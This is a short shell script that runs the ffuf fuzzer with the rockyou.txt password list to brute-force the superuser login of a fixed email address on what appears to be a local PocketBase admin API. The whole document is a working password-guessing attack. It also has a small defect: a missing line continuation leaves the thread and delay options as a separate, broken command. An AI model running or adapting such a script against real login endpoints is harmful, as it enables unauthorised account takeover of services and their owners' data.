#!/bin/sh

ffuf -w ./rockyou.txt:PASS \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"identity":"wil@42.fr","password":"PASS"}' \
  -u http://localhost:8090/api/collections/_superusers/auth-with-password \
  -fc 400,401
  -t 5 -p 0.1
